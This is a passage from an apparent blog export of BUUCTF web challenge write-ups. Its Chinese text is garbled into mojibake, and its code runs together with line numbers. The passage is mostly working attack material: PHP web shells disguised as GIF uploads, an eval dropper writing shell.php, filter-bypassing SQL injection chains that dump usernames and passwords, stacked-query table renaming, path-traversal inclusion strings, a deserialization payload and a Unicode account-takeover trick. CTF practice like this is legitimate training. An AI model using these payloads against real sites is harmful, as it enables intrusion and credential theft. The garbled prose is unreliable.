__wakeup()å‡½æ•°çš„æ‰§è¡Œ ã€‚ å› æ­¤æœ€ç»ˆçš„ payload å¦‚ä¸‹ï¼šæ”¹ä¸ºå¤§äº2å³å¯ 1?select=O:4:&quot;Name&quot;:4:&#123;s:14:&quot;%00Name%00username&quot;;s:5:&quot;admin&quot;;s:14:&quot;%00Name%00password&quot;;i:100;&#125; 5.1 æ€»ç»“ï¼šåºåˆ—åŒ– Private æ‰€å£°æ˜çš„ç§æœ‰å˜é‡ åªèƒ½åœ¨æ‰€å£°æ˜çš„ç±»ä¸­å¯è§ï¼Œåœ¨è¯¥ç±»çš„å­ç±»ä»¥åŠè¯¥ç±»çš„å¯¹è±¡ä¸­å‡ä¸å¯è§ã€‚æ‰€ä»¥ç§æœ‰å˜é‡åœ¨åºåˆ—åŒ–æ—¶ï¼Œç±»åå’Œå­—æ®µåå‰é¢éƒ½ä¼šåŠ ä¸Š %00 ï¼Œå³ ascii ä¸º0çš„å­—ç¬¦ï¼ˆä¸å¯è§å­—ç¬¦ï¼‰ï¼› Protected æ‰€å£°æ˜å—ä¿æŠ¤ç±»å‹çš„å˜é‡ åºåˆ—åŒ–æ—¶ä¼šæœ‰ %00*%00 å­—ç¬¦ï¼› æµ‹è¯•ä¸€ï¼š 12345678910&lt;?phpclass FileHandler &#123; public $op=&#x27;2&#x27;; public $filename=&#x27;flag.php&#x27;; public $content;&#125;$flag = new FileHandler();$flag_1 = (serialize($flag));echo $flag_1;?&gt; 12#è¿”å›O:11:&quot;FileHandler&quot;:3:&#123;s:2:&quot;op&quot;;s:1:&quot;2&quot;;s:8:&quot;filename&quot;;s:8:&quot;flag.php&quot;;s:7:&quot;content&quot;;N;&#125; æµ‹è¯•äºŒï¼š 12345678910&lt;?phpclass FileHandler &#123; private $op=&#x27;2&#x27;; private $filename=&#x27;flag.php&#x27;; private $content;&#125;$flag = new FileHandler();$flag_1 = (serialize($flag));echo $flag_1;?&gt; 12#è¿”å›O:11:&quot;FileHandler&quot;:3:&#123;s:15:&quot;FileHandlerop&quot;;s:1:&quot;2&quot;;s:21:&quot;FileHandlerfilename&quot;;s:8:&quot;flag.php&quot;;s:20:&quot;FileHandlercontent&quot;;N;&#125; 12#å®é™…ä¸Šæ˜¯O:11:&quot;FileHandler&quot;:3:&#123;s:15:&quot;%00FileHandler%00op&quot;;s:1:&quot;2&quot;;s:21:&quot;%00FileHandler%00filename&quot;;s:8:&quot;flag.php&quot;;s:20:&quot;%00FileHandler%00content&quot;;N;&#125; æµ‹è¯•ä¸‰ï¼š 12345678910&lt;?phpclass FileHandler &#123; protected $op=&#x27;2&#x27;; protected $filename=&#x27;flag.php&#x27;; protected $content;&#125;$flag = new FileHandler();$flag_1 = (serialize($flag));echo $flag_1;?&gt; 12#è¿”å›O:11:&quot;FileHandler&quot;:3:&#123;s:5:&quot;*op&quot;;s:1:&quot;2&quot;;s:11:&quot;*filename&quot;;s:8:&quot;flag.php&quot;;s:10:&quot;*content&quot;;N;&#125; 12#å®é™…ä¸Šæ˜¯O:11:&quot;FileHandler&quot;:3:&#123;s:5:&quot;%00*%00op&quot;;s:1:&quot;2&quot;;s:11:&quot;%00*%00filename&quot;;s:8:&quot;flag.php&quot;;s:10:&quot;%00*%00content&quot;;N;&#125; å…­ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Upload1è€ƒç‚¹ï¼šæ–‡ä»¶ä¸Šä¼ ï¼Œè¿‡ &lt;? ç›´æ¥ 1.php å°è¯• ç´§æ¥ç€å¸¸è§„æ“ä½œï¼Œä¿®æ”¹ Content-Type å°è¯•å…¶å®ƒåç¼€ç±»å‹ï¼Œå‘ç° .php3 .php2 .php5 å‡ä¸è¡Œï¼Œè€Œ .phtml å¯ä»¥ ä¸èƒ½å«æœ‰ &lt;? ï¼Œé‚£ä¹ˆå°±å¾—ä½¿ç”¨å…¶å®ƒå½¢å¼ 123# hack_GIF_ma.phtmlGIF89a&lt;script language=&quot;php&quot;&gt;@eval($_REQUEST[&#x27;111&#x27;])&lt;/script&gt; æ¥ä¸‹æ¥å°±æ˜¯è·å–å›¾ç‰‡ä¸Šä¼ çš„è·¯å¾„ æœ€åèšå‰‘è¿æ¥å³å¯ 6.1 PHP ä¸€å¥è¯æœ¨é©¬å˜å½¢è¿‡ &lt;?ï¼š 123//.gifGIF89a&lt;script language=&quot;php&quot;&gt;@eval($_REQUEST[&#x27;cmd&#x27;])&lt;/script&gt; å¸¸ç”¨ï¼š 123//.gifGIF89a&lt;?php fputs(fopen(&#x27;shell.php&#x27;,&#x27;w&#x27;),&quot;&lt;?php @eval($_REQUEST[&#x27;cmd&#x27;])?&gt;&quot;); ?&gt; ä¸ƒã€[ACTF2020 æ–°ç”Ÿèµ›]Upload1è€ƒç‚¹ï¼šæ–‡ä»¶ä¸Šä¼ ï¼Œå‰åç«¯ç»•è¿‡ ç›´æ¥ 1.php å°è¯• å®¡æŸ¥å…ƒç´ ï¼Œå‰ç«¯å­˜åœ¨è¿‡æ»¤ åˆ é™¤è¯¥ä»£ç ï¼Œå†æ¬¡ä¸Šä¼ ï¼Œè™½ç„¶æ²¡æœ‰å‡ºç°æç¤ºæ¡†ï¼Œä½†ä»æ—§æ²¡æœ‰æˆåŠŸä¸Šä¼  æˆ‘ä»¬ä½¿ç”¨ 123# hack_GIF_ma.phtmlGIF89a&lt;script language=&quot;php&quot;&gt;@eval($_REQUEST[&#x27;111&#x27;])&lt;/script&gt; æˆåŠŸä¸Šä¼ ï¼Œç„¶åèšå‰‘è¿æ¥å³å¯ï¼Œè¯¥é¢˜ä¹Ÿå¯ä¸Šä¼  .php2 å…«ã€[æå®¢å¤§æŒ‘æˆ˜2019]BabySQL1è€ƒç‚¹ï¼šSQLæ³¨å…¥ä¹‹ orã€andã€fromã€selectç­‰çš„è¿‡æ»¤ 1q&#x27;# #å•å¼•å·é—­åˆ ç»è¿‡æµ‹è¯•ï¼Œor and union select 1234567891011121314151617#è”åˆæŸ¥è¯¢ åŒå†™ç»•è¿‡ æœ‰å›æ˜¾#è¿‡æ»¤äº† from where or select andq&#x27; UnUNIONIOn SeSelectLect 1,2,3##å¾—åˆ°æ•°æ®åº“ geek-q&#x27; UnUNIONIOn SeSelectLect 1,database(),3##å¾—åˆ°è¡¨b4bsql,geekuser-q&#x27; UnUNIONIOn SeSelectLect 1,(selselectect group_concat(table_name) frfromom infoORrmation_schema.tables whwhereere table_schema=database()),3# #å¾—åˆ°åˆ—id,username,password-q&#x27; UnUNIONIOn SeSelectLect 1,(selselectect group_concat(column_name) frfromom infoORrmation_schema.columns whwhereere table_schema=database() aandnd table_name=0x62346273716c),3# #å¾—åˆ°flag-q&#x27; UnUNIONIOn SeSelectLect 1,(selselectect group_concat(concat_ws(&#x27;~&#x27;,username,passwOorRd)) frfromom geek.b4bsql),3# ä¹ã€[ACTF2020 æ–°ç”Ÿèµ›]BackupFile1è€ƒç‚¹ï¼šå¤‡ä»½æ–‡ä»¶æ³„éœ²ã€PHPå¼±ç±»å‹ diesearch æ‰« æ ¹æ®æç¤ºåº”è¯¥æ˜¯.bakä¹‹ç±»çš„ å°è¯•ä¹‹åï¼Œ/index.php.bak æˆåŠŸä¸‹è½½ï¼ŒæŸ¥çœ‹å…¶ä¸­å†…å®¹ 12345678910111213141516&lt;?phpinclude_once &quot;flag.php&quot;;if(isset($_GET[&#x27;key&#x27;])) &#123; $key = $_GET[&#x27;key&#x27;]; if(!is_numeric($key)) &#123; exit(&quot;Just num!&quot;); &#125; $key = intval($key); $str = &quot;123ffwsfwefwf24r2f32ir23jrw923rskfjwtsw54w3&quot;; if($key == $str) &#123; echo $flag; &#125;&#125;else &#123; echo &quot;Try to find out source file!&quot;;&#125; ç®€å•çš„ phpå¼±ç±»å‹æ¯”è¾ƒ 12#æ„é€ ?key=123 è·å–åˆ° flag 9.1 æ€»ç»“dirsearch å·¥å…·ï¼š https://github.com/maurosoria/dirsearch 123456# kali ä¸‹è½½git clone https://github.com/maurosoria/dirsearchcd dirsearch/#ä½¿ç”¨./dirsearch.py -u ç›®æ ‡ç½‘å€ -e * # *ä»£è¡¨æ‰€æœ‰ç±»å‹çš„è„šæœ¬./dirsearch.py -u http://df0ee6df-14b2-4f2b-a5f3-2581279eee8d.node3.buuoj.cn/ -e * å¸¸è§çš„å¤‡ä»½æ–‡ä»¶åç¼€ï¼š.git .svn .swp .~ .bak .bash_history.zip.tar.gz.rar.7z https://www.anquanke.com/post/id/164086#h3-13) åã€[HCTF 2018]admin1è€ƒç‚¹ï¼š æ³¨å†Œä¸€ä¸ªç”¨æˆ·ï¼ŒæŸ¥çœ‹å„ä¸ªé¡µé¢çš„æºç ï¼Œå‘ç° ä¸‹è½½ flask æ¨¡æ¿æºç  ä¸€ä¸€æŸ¥çœ‹ä»£ç ï¼Œæ‰¾æœ‰ç”¨çš„ä¿¡æ¯ index.html éœ€è¦æˆ‘ä»¬çš„ session æ˜¯ admin çš„ routes.py 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108#!/usr/bin/env python# -*- coding:utf-8 -*-from flask import Flask, render_template, url_for, flash, request, redirect, session, make_responsefrom flask_login import logout_user, LoginManager, current_user, login_userfrom app import app, dbfrom config import Configfrom app.models import Userfrom forms import RegisterForm, LoginForm, NewpasswordFormfrom twisted.words.protocols.jabber.xmpp_stringprep import nodeprepfrom io import BytesIOfrom code import get_verify_code@app.route(&#x27;/code&#x27;)def get_code(): image, code = get_verify_code() # å›¾ç‰‡ä»¥äºŒè¿›åˆ¶å½¢å¼å†™å…¥ buf = BytesIO() image.save(buf, &#x27;jpeg&#x27;) buf_str = buf.getvalue() # æŠŠbuf_strä½œä¸ºresponseè¿”å›å‰ç«¯ï¼Œå¹¶è®¾ç½®é¦–éƒ¨å­—æ®µ response = make_response(buf_str) response.headers[&#x27;Content-Type&#x27;] = &#x27;image/gif&#x27; # å°†éªŒè¯ç å­—ç¬¦ä¸²å‚¨å­˜åœ¨sessionä¸­ session[&#x27;image&#x27;] = code return response@app.route(&#x27;/&#x27;)@app.route(&#x27;/index&#x27;)def index(): return render_template(&#x27;index.html&#x27;, title = &#x27;hctf&#x27;)@app.route(&#x27;/register&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])def register(): if current_user.is_authenticated: return redirect(url_for(&#x27;index&#x27;)) form = RegisterForm() if request.method == &#x27;POST&#x27;: name = strlower(form.username.data) if session.get(&#x27;image&#x27;).lower() != form.verify_code.data.lower(): flash(&#x27;Wrong verify code.&#x27;) return render_template(&#x27;register.html&#x27;, title = &#x27;register&#x27;, form=form) if User.query.filter_by(username = name).first(): flash(&#x27;The username has been registered&#x27;) return redirect(url_for(&#x27;register&#x27;)) user = User(username=name) user.set_password(form.password.data) db.session.add(user) db.session.commit() flash(&#x27;register successful&#x27;) return redirect(url_for(&#x27;login&#x27;)) return render_template(&#x27;register.html&#x27;, title = &#x27;register&#x27;, form = form)@app.route(&#x27;/login&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])def login(): if current_user.is_authenticated: return redirect(url_for(&#x27;index&#x27;)) form = LoginForm() if request.method == &#x27;POST&#x27;: name = strlower(form.username.data) session[&#x27;name&#x27;] = name user = User.query.filter_by(username=name).first() if user is None or not user.check_password(form.password.data): flash(&#x27;Invalid username or password&#x27;) return redirect(url_for(&#x27;login&#x27;)) login_user(user, remember=form.remember_me.data) return redirect(url_for(&#x27;index&#x27;)) return render_template(&#x27;login.html&#x27;, title = &#x27;login&#x27;, form = form)@app.route(&#x27;/logout&#x27;)def logout(): logout_user() return redirect(&#x27;/index&#x27;)@app.route(&#x27;/change&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])def change(): if not current_user.is_authenticated: return redirect(url_for(&#x27;login&#x27;)) form = NewpasswordForm() if request.method == &#x27;POST&#x27;: name = strlower(session[&#x27;name&#x27;]) user = User.query.filter_by(username=name).first() user.set_password(form.newpassword.data) db.session.commit() flash(&#x27;change successful&#x27;) return redirect(url_for(&#x27;index&#x27;)) return render_template(&#x27;change.html&#x27;, title = &#x27;change&#x27;, form = form)@app.route(&#x27;/edit&#x27;, methods = [&#x27;GET&#x27;, &#x27;POST&#x27;])def edit(): if request.method == &#x27;POST&#x27;: flash(&#x27;post successful&#x27;) return redirect(url_for(&#x27;index&#x27;)) return render_template(&#x27;edit.html&#x27;, title = &#x27;edit&#x27;)@app.errorhandler(404)def page_not_found(error): title = unicode(error) message = error.description return render_template(&#x27;errors.html&#x27;, title=title, message=message)def strlower(username): username = nodeprep.prepare(username) return username 10.1 æ³•ä¸€ï¼šsession æ¬ºéª—â€‹ åˆ©ç”¨ Flask æ˜¯ä¸€ç§ä¸åŒ…å«æ•°æ®åº“æ“ä½œçš„æ¡†æ¶ï¼Œåªèƒ½å°† session å‚¨å­˜åœ¨ cookie å½“ä¸­ã€‚ â€‹ è¿™é‡Œä½¿ç”¨ç¬¬äºŒç§æ–¹æ³•ï¼Œä¸‹é¢ä»‹ç»ã€‚ å‚è€ƒï¼š Flask session å®‰å…¨æ€§é—®é¢˜ https://www.jianshu.com/p/f92311564ad0 10.2 Unicode æ¬ºéª—â€‹ çœ‹ä¸Šé¢çš„è·¯ç”±ä»£ç ï¼Œæ¯å½“ç”¨æˆ·è¾“å…¥ç”¨æˆ·åçš„æ—¶å€™ï¼Œéƒ½ä¼šè¿›è¡Œ å°† name è½¬æ¢ä¸ºå°å†™ çš„æ“ä½œï¼Œè€Œè£…æ¬¢çš„å‡½æ•°å¹¶ä¸æ˜¯ PHPè‡ªå¸¦çš„å‡½æ•° lower ï¼Œåœ¨ä»£ç æœ€åå‘ç°ï¼Œä½¿ç”¨çš„æ˜¯è‡ªå·±å®šä¹‰çš„ä¸€ä¸ªå‡½æ•° strlower ã€‚ â€‹ è¯¥å‡½æ•°å®šä¹‰çš„æ–¹æ³•æ˜¯ä½¿ç”¨äº† nodeprep.prepare ï¼Œè€Œ from twisted.words.protocols.jabber.xmpp_stringprep import nodeprep ï¼Œå¯ä»¥çœ‹åˆ°è¯¥å‡½æ•°æ˜¯ä» twisted ä¸­å¯¼å…¥çš„ã€‚ä»æ‰€ç»™çš„ requirements.txt æ–‡ä»¶æ–‡ä»¶ä¸­çœ‹åˆ°ï¼Œ è¯¥ Twisted ç‰ˆæœ¬æ˜¯ 10.2.0 ï¼Œè€Œä¸Šç½‘æŸ¥åˆ°ï¼Œä¸å®˜ç½‘çš„æœ€æ–°ç‰ˆæœ¬å·®è·å¾ˆå¤§ï¼Œä»è€ŒçŒœæµ‹ä¼šå­˜åœ¨æ¼æ´ã€‚ ä¸€äº›å…³äº Unicode çš„å®‰å…¨æ€§é—®é¢˜åšå®¢ï¼Œå‚è€ƒé“¾æ¥ï¼š https://www.dazhuanlan.com/2019/12/09/5dedf52936197/ https://xz.aliyun.com/t/5402 https://gality.cn/?p=123 https://blog.lyle.ac.cn/2018/12/08/idnfuzz/ https://blog.lyle.ac.cn/2018/10/29/unicode-normalization/ åŸç†å°±æ˜¯å¦‚æœæˆ‘ä»¬æ³¨å†Œä¸€ä¸ª á´¬dmin çš„ç”¨æˆ·ï¼Œæ³¨å†Œæ—¶ç»è¿‡nodeprep.prepare è½¬åŒ–å°†ä¼šå˜ä¸º Admin ï¼Œè€Œå¦‚æœ Admin å†æ¬¡è°ƒç”¨ä¸€æ¬¡ nodeprep.prepare ï¼Œåˆä¼šæŠŠ A å˜æˆ a ã€‚æ‰€ä»¥å¦‚æœæˆ‘ä»¬ æ³¨å†Œä¸€ä¸ª á´¬dmin ï¼Œç„¶åä¿®æ”¹å¯†ç è¯¥ç”¨æˆ·çš„å¯†ç ï¼Œå°±ç›¸å½“äºä¿®æ”¹çš„æ˜¯ admin çš„å¯†ç ï¼Œä»è€Œè¾¾åˆ°æœ€ç»ˆè¶Šæƒçš„ç›®çš„ã€‚ è§£é¢˜ï¼š æ³¨å†Œ á´¬dmin ç”¨æˆ·å¹¶ç™»é™†è¿›å»ï¼Œå¯ä»¥çœ‹åˆ°ç›¸å½“äºç™»é™†çš„æ˜¯ Admin ç”¨æˆ· ä¿®æ”¹ á´¬dmin ç”¨æˆ·çš„å¯†ç ä¸º 123456 ä½¿ç”¨ admin ç”¨æˆ·ï¼Œå¯†ç ä¸º 123456 ç™»å½•ï¼Œå¾—åˆ° flag","categories":[{"name":"BUUCTF","slug":"BUUCTF","permalink":"https://xizhi-future.github.io/categories/BUUCTF/"}],"tags":[{"name":"CTF","slug":"CTF","permalink":"https://xizhi-future.github.io/tags/CTF/"},{"name":"Web","slug":"Web","permalink":"https://xizhi-future.github.io/tags/Web/"},{"name":"BUUCTF","slug":"BUUCTF","permalink":"https://xizhi-future.github.io/tags/BUUCTF/"}],"author":"xizhi-future"},{"title":"BUUCTF-Web(ä¸€)","slug":"BUUCTF-WEBï¼ˆä¸€ï¼‰","date":"2021-05-26T11:18:25.000Z","updated":"2021-10-07T10:14:26.347Z","comments":true,"path":"2021/05/26/BUUCTF-WEBï¼ˆä¸€ï¼‰/","link":"","permalink":"https://xizhi-future.github.io/2021/05/26/BUUCTF-WEB%EF%BC%88%E4%B8%80%EF%BC%89/","excerpt":"æ¦‚è¿°ï¼šBUUCTF-WEB å‰åé“é¢˜ç›®ï¼Œæ¯”è¾ƒåŸºç¡€ï¼Œä¸»è¦è€ƒå¯Ÿæ–‡ä»¶åŒ…å«ã€SQLæ³¨å…¥ã€å‘½ä»¤æ‰§è¡Œã€æºç æ³„éœ²ã€‚","text":"æ¦‚è¿°ï¼šBUUCTF-WEB å‰åé“é¢˜ç›®ï¼Œæ¯”è¾ƒåŸºç¡€ï¼Œä¸»è¦è€ƒå¯Ÿæ–‡ä»¶åŒ…å«ã€SQLæ³¨å…¥ã€å‘½ä»¤æ‰§è¡Œã€æºç æ³„éœ²ã€‚ ä¸€ã€[HCTF 2018]WarmUpè€ƒç‚¹ï¼šæ–‡ä»¶åŒ…å«ã€ä»£ç å®¡è®¡ Ctrl + U æŸ¥çœ‹æºç  è®¿é—®å¾—åˆ° 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849 &lt;?php highlight_file(__FILE__); class emmm &#123; public static function checkFile(&amp;$page) &#123; $whitelist = [&quot;source&quot;=&gt;&quot;source.php&quot;,&quot;hint&quot;=&gt;&quot;hint.php&quot;]; if (! isset($page) || !is_string($page)) &#123; echo &quot;you can&#x27;t see it&quot;; return false; &#125; if (in_array($page, $whitelist)) &#123; return true; &#125; $_page = mb_substr( $page, 0, mb_strpos($page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; $_page = urldecode($page); //urlè§£å¯† $_page = mb_substr( $_page, 0, mb_strpos($_page . &#x27;?&#x27;, &#x27;?&#x27;) ); if (in_array($_page, $whitelist)) &#123; return true; &#125; echo &quot;you can&#x27;t see it&quot;; return false; &#125; &#125; if (! empty($_REQUEST[&#x27;file&#x27;]) &amp;&amp; is_string($_REQUEST[&#x27;file&#x27;]) //æ£€æŸ¥å˜é‡æ˜¯å¦æ˜¯å­—ç¬¦ä¸²ï¼Œæ˜¯è¿”å› true ï¼Œå¦è¿”å› false &amp;&amp; emmm::checkFile($_REQUEST[&#x27;file&#x27;]) ) &#123; include $_REQUEST[&#x27;file&#x27;]; exit; &#125; else &#123; echo &quot;&lt;br&gt;&lt;img src=\\&quot;https://i.loli.net/2018/11/01/5bdb0d93dc794.jpg\\&quot; /&gt;&quot;; &#125; ?&gt; å°†è·å–åˆ°çš„fileå˜é‡å†…å®¹è¿›è¡Œä¸¤æ¬¡é—®å·è¿‡æ»¤ï¼Œæ¯ä¸€æ¬¡åªæˆªå–åˆ°ç¬¬ä¸€ä¸ªé—®å·çš„å‰é¢éƒ¨åˆ†å†…å®¹ï¼Œæˆ‘ä»¬è¦æƒ³æ¯æ¬¡æˆªåˆ°çš„éƒ¨åˆ†éƒ½ç¬¦åˆç™½åå•ï¼Œå³ source.php æˆ–è€…æ˜¯ hint.phpã€‚ æµ‹è¯• 1http://fde198a0-d059-40ed-bdbd-3812ba8e8ad3.node3.buuoj.cn/source.php?file=hint.php å¾—åˆ° flag not here, and flag in ffffllllaaaaggggï¼Œç”±äºGETä¼ å‚å°†ä¼šè‡ªåŠ¨å¯¹ç‰¹æ®Šå­—ç¬¦è¿›è¡Œurlç¼–ç ï¼Œåˆ™åˆ©ç”¨ urldecode()å‡½æ•° æ„é€ å¦‚ä¸‹ 123456789source.php/?file=hint.php%253f/../../../../ffffllllaaaaggggsource.php/?file=source.php%253f/../../../../ffffllllaaaaggggsource.php/?file=source.php%253f/../../../../../ffffllllaaaagggg#é—®å·è¿›è¡Œ ä¸¤æ¬¡urlç¼–ç  ä¹‹åä¸º % ï¼ŒGETä¼ å‚é¦–å…ˆè‡ªåŠ¨è§£ç ä¸º %3f(æ˜¯?è¿›è¡Œä¸€æ¬¡urlç¼–ç çš„ç»“æœ)ï¼Œå…¶ä¸­æ²¡æœ‰?ï¼ŒåŸæ ·è¿”å›ï¼Œç»•è¿‡ç¬¬ä¸€æ¬¡è¿‡æ»¤ï¼Œç„¶å urldecode() å‡½æ•°å†æ¬¡urlè§£ç å¾—åˆ°é—®å·ï¼Œç¬¬äºŒæ¬¡é—®å·è¿‡æ»¤æˆªå–åˆ°ç»“æœ source.php ç¬¦åˆæ¡ä»¶ã€‚source.php/?file=hint.php?/../../../../../ffffllllaaaaggggsource.php/?file=source.php?/../../../../../ffffllllaaaaggggsource.php/?file=source.php?/../../../../../../ffffllllaaaagggg#ç»è¿‡GETä¼ å‚ä¹‹åå˜æˆ =source.php%3f..%2f..%2f..%2f..%2f..%2fffffllllaaaaggggï¼Œå…¶ä¸­æ²¡æœ‰?ï¼ŒåŸæ ·è¿”å›ï¼Œç»•è¿‡ç¬¬ä¸€æ¬¡è¿‡æ»¤ï¼Œç„¶å urldecode() å‡½æ•°è§£ç å›åˆ° =source.php?../../../../../ffffllllaaaaggggï¼Œç¬¬äºŒæ¬¡é—®å·è¿‡æ»¤æˆªå–åˆ°ç»“æœ source.php ç¬¦åˆæ¡ä»¶ã€‚ æ€»ç»“ : 1234#æ€»ç»“å‡½æ•° mb_substr() å‡½æ•°è¿”å›å­—ç¬¦ä¸²çš„ä¸€éƒ¨åˆ†ï¼Œä¹‹å‰æˆ‘ä»¬å­¦è¿‡ substr() å‡½æ•°ï¼Œå®ƒåªé’ˆå¯¹è‹±æ–‡å­—ç¬¦ï¼Œå¦‚æœè¦åˆ†å‰²çš„ä¸­æ–‡æ–‡å­—åˆ™éœ€è¦ä½¿ç”¨ mb_substr() is_string() æ£€æŸ¥å˜é‡æ˜¯å¦æ˜¯å­—ç¬¦ä¸²ï¼Œæ˜¯è¿”å› true ï¼Œå¦è¿”å› false mb_strpos (haystack ,needle) è¿”å›è¦æŸ¥æ‰¾çš„å­—ç¬¦ä¸²ï¼ˆhaystackï¼‰åœ¨åˆ«ä¸€ä¸ªå­—ç¬¦ä¸²ï¼ˆneedleï¼‰ä¸­é¦–æ¬¡å‡ºç°çš„ä½ç½®ï¼Œå¦‚æ²¡æœ‰åˆ™è¿”å›åŸå­—ç¬¦ä¸² äºŒã€[æå®¢å¤§æŒ‘æˆ˜ 2019]EasySQL1è€ƒç‚¹ï¼šSQLæ³¨å…¥ ä¹‹ ä¸‡èƒ½å¯†ç  â€˜ or 1=1 12#æˆ‘ä»¬ä½¿ç”¨ &#x27;) åˆ¤æ–­é—­åˆæ–¹å¼q&#x27;) å•å¼•å·é—­åˆ 12#ä¸‡èƒ½å¯†ç å°è¯•&#x27; or 1=1# ä¸‰ã€[æå®¢å¤§æŒ‘æˆ˜ 2019]Havefun1è€ƒç‚¹ï¼šæºç æ³„éœ² Ctrl + U æŸ¥çœ‹æºä»£ç å‘ç° åˆ™æˆ‘ä»¬è®¿é—® ?cat=dog ï¼Œå¾—åˆ° å››ã€[å¼ºç½‘æ¯ 2019]éšä¾¿æ³¨1è€ƒç‚¹ï¼šSQLæ³¨å…¥ ä¹‹ å †å æŸ¥è¯¢ æŠ€èƒ½ï¼šmysql è¡¨ç»“æ„çš„æ›´æ”¹è¯­å¥ 12341&#x27; #å¾—åˆ°æŠ¥é”™ï¼Œå•å¼•å·é—­åˆ1&#x27; or 1=1# #ä¸‡èƒ½å¯†ç å°è¯•1&#x27; order by 2 #ä¸¤åˆ—1&#x27; union select 1,2# è¿”å› 1return preg_match(&quot;/select|update|delete|drop|insert|where|\\./i&quot;,$inject); å †å æŸ¥è¯¢ï¼š 11&#x27;;show databases;# 11&#x27;;show tables;# 11&#x27;;desc `1919810931114514`;# #æŸ¥è¡¨çš„ç»“æ„ å­˜åœ¨ flag å­—æ®µ 11&#x27;;desc words;# æ³¨ï¼šwindowsç³»ç»Ÿä¸‹ï¼Œåå•å¼•å·ï¼ˆ`ï¼‰æ˜¯æ•°æ®åº“ã€è¡¨ã€ç´¢å¼•ã€åˆ—å’Œåˆ«åç”¨çš„å¼•ç”¨ç¬¦ï¼Œå¼•ç”¨æ•°å­—åç§°æ—¶ï¼Œéœ€è¦åå¼•å·åŒ…è£¹ï¼Œå­—æ¯å‹å¯ä¸ç”¨åŒ…è£¹ã€‚ åˆ†æï¼š æˆ‘ä»¬æäº¤æŸ¥è¯¢çš„å†…å®¹åº”è¯¥å°±æ˜¯è¯¥è¡¨ï¼ˆwordsï¼‰ä¸­çš„æ•°æ®ï¼Œè€ŒSQLè¯­å¥åº”è¯¥ç±»ä¼¼äº selsect id,data from words where id = ï¼›è€Œå‰é¢å·²ç»å‘ç°ï¼Œflag å­˜åœ¨å¦ä¸€å¼ è¡¨ï¼ˆ1919810931114514ï¼‰ä¸­ã€‚ æ–¹æ³•ä¸€ï¼šæ›´æ”¹ words è¡¨å ä¸º å…¶å®ƒï¼Œ1919810931114514 è¡¨åä¸º wordsï¼›flag å­—æ®µåä¸º idã€‚è¿™æ ·æŸ¥è¯¢çš„å³æ˜¯ 1919810931114514 ä¸­çš„ flagå­—æ®µäº†ã€‚ 11&#x27;;rename table `words` to `others`;rename table `1919810931114514` to `words`;alter table words change column flag id varchar(100);show tables;desc words;# å¯ä»¥çœ‹åˆ°è¡¨çš„ç»“æ„å·²ç»æˆåŠŸè¢«æˆ‘ä»¬æ›´æ”¹ï¼Œæœ€åï¼Œåªéœ€è¦ç›´æ¥ä½¿ç”¨ä¸‡èƒ½å¯†ç å³å¯ 11&#x27; or 1=1# è¡¥å……ï¼š 120&#x27;;show columns from words;#0&#x27;;show columns from `1919810931114514`;# æ€»ç»“ï¼šmysql å¯¹ è¡¨çš„ç»“æ„çš„æ›´æ”¹è¯­å¥ 12345678910111213141516# ä¿®æ”¹è¡¨åç§°ï¼šè¯­æ³•ä¸€ï¼š alter table tbl_name rename[to|as] new_tbl_name --å¯ä»¥æ›´æ”¹ä¸€å¼ æ•°æ®è¡¨åç§°è¯­æ³•äºŒï¼šrename table tbl_name to new_tbl_name [,tbl_name2 TO new_tbl_namewâ€¦â€¦ --å¯ä»¥å¤šè¡¨æ›´æ”¹åç§°#æ·»åŠ è¡¨åˆ—alter table test add column name varchar(10); #åˆ é™¤è¡¨åˆ—alter table test drop column name; #ä¿®æ”¹è¡¨åˆ—ç±»å‹alter table test modify address char(10) ||alter table test change address address char(40)#ä¿®æ”¹è¡¨åˆ—åalter table test change column address address1 varchar(30) äº”ã€[SUCTF 2019]EasySQL1è€ƒç‚¹ï¼šå †å æ³¨å…¥ã€ç‰¹æ®Šè¯­æ³• 121# #æ•°å­—å‹æ³¨å…¥1;select database();# #æŸ¥åˆ°æ•°æ®åº“ ctf å°è¯• å †å æ³¨å…¥ 11;select database();(select group_concat(table_name) from information_schema.tables where table_schema = &#x27;ctf&#x27;);# æ²¡æœ‰è·å–åˆ°ï¼Œæœ‰ä¸œè¥¿è¢«è¿‡æ»¤æ‰äº†ï¼Œç»§ç»­å°è¯• 121;show database;# #æŸ¥åˆ°æ‰€æœ‰æ•°æ®åº“1;show tables;# #æŸ¥åˆ°è¡¨ flag ç´§æ¥ç€å½“ç„¶ä¼šæ˜¯æƒ³è¦æŸ¥è¡¨ Flag ä¸­çš„å­—æ®µå†…å®¹ 11;show columns from Flag;# #æŸ¥ä¸åˆ° è¿™æ—¶å› ä¸ºFlagå·²ç»è¢«è¿‡æ»¤æ‰äº†ï¼Œå¯ä»¥æ‰¾ä¸ªè„šæœ¬è·‘ä¸€ä¸‹ï¼Œçœ‹çœ‹éƒ½è¢«è¿‡æ»¤äº†ä»€ä¹ˆ è¿™äº›éƒ½æ˜¯è¢«è¿‡æ»¤æ‰çš„ï¼Œå¯ä»¥å‘ç° * å’Œ || å¹¶æ²¡æœ‰è¢«è¿‡æ»¤ ç½‘ä¸Šæ±‚è§£ï¼šè²Œä¼¼æœ‰è¯´å­˜åœ¨æºç æ³„éœ²çš„ index.php.swp ï¼Œå…¶ä¸­åŒ…å«ä¸€æ¡æŸ¥è¯¢ä»£ç  $sql = &quot;select &quot;.$post[&#39;query&#39;].&quot;||flag from Flag&quot;; 123456789101112131415161718192021222324252627&lt;?php if(isset($post[&#x27;query&#x27;]))&#123; $BlackList = &quot;prepare|flag|unhex|xml|drop|create|insert|like|regexp|outfile |readfile|where|from|union|update|delete|if|sleep|extractvalue| updatexml|or|and|&amp;|\\&quot;&quot;; //var_dump(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&#x27;query&#x27;])); if(preg_match(&quot;/&#123;$BlackList&#125;/is&quot;,$post[&#x27;query&#x27;]))&#123; //echo $post[&#x27;query&#x27;]; die(&quot;Nonono.&quot;); &#125; if(strlen($post[&#x27;query&#x27;])&gt;40)&#123; die(&quot;Too long.&quot;); 